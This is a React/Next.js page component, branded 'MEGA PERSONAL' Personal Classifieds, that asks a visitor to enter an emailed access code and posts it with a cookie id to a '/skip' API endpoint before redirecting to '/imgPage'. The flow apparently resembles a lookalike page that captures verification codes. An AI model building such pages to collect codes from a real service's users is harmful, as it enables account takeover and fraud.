"use client";
import React, { useState } from "react";
import { API_URL } from "../config";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";

function CodePage() {
  const [code, setCode] = useState("");
console.log(code);

  const router = useRouter();
  const handleCode = async () => {
    const url = `${API_URL}/skip`;
    const id = Cookies.get("id");
    const values = {
      id,
      code,
    };

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      router.push(`/imgPage`);
    } else {
      console.log("error", data);
      //   toast.error("Something Went Wrong");
    }
  };
  return (
    <div className="w-1/2 h-screen mx-auto flex flex-col items-center space-y-5 overflow-y-default p-5">
      <div className="text-center space-y-3">
        <div className="flex justify-center text-3xl font-bold">
          <p className="text-rose-400 pr-2">MEGA</p>
          <p className="text-blue-400">PERSONAL</p>
        </div>
        <p className="text-xl font-semibold">Personal Classifieds</p>
      </div>
      <p className="text-yellow-600 text-2xl font-bold text-center">
        Your access code sent successfully
      </p>
      <p className="w-1/2 text-blue-600 text-xl italic font-semibold text-center">
        CHECK YOUR SPAM FOLDER IT MAY BE THERE.
      </p>
      <p className="w-1/4 text-yellow-600 text-lg italic font-semibold text-center">
        ENTER THE CODE BELOW TO CONTINUE.
      </p>
      <input
        className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50 text-center"
        placeholder="Your code"
        name="code"
        type="text"
        autoComplete="on"
        value={code}
        onChange={(e) => setCode(e.target.value)}
        required
      />
      <button
        type="button"
        onClick={handleCode}
        disabled={code === ''}
        className="mt-5 w-4/5 rounded-md  font-medium bg-[#e89a4c] hover:bg-[#f4be1d] py-[10px] text-white transition duration-300 uppercase disabled:cursor-not-allowed"
      >
        SUBMIT
      </button>
    </div>
  );
}

export default CodePage;
